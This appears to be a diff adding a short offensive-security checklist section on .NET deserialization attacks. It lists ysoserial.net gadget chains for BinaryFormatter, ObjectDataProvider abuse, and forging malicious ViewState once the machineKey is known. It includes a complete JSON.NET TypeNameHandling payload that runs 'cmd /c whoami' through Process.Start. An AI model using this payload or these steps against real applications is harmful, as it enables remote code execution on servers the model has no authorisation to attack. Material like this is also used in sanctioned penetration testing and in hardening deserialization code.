@@ -1,0 +1,13 @@
+**Phase 3: .NET Deserialization**
+- **BinaryFormatter**:
+  - `ysoserial.net` gadgets: `TypeConfuseDelegate`, `TextFormattingRunProperties`, `WindowsIdentity`
+  - Requires `TypeResolver` or known assembly
+- **XmlSerializer / DataContractSerializer**:
+  - Less dangerous but possible with `ObjectDataProvider` (WPF)
+- **JSON.NET (Newtonsoft)**:
+  - `TypeNameHandling.Auto` / `All` → RCE via `ObjectDataProvider`
+  - Payload: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"},"MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","$values":["cmd","/c whoami"]}}`
+- **ViewState**:
+  - Decode base64 → check for `__VIEWSTATE`
+  - If `machineKey` known → sign malicious payload
+  - Use `ViewStateGenerator` tool
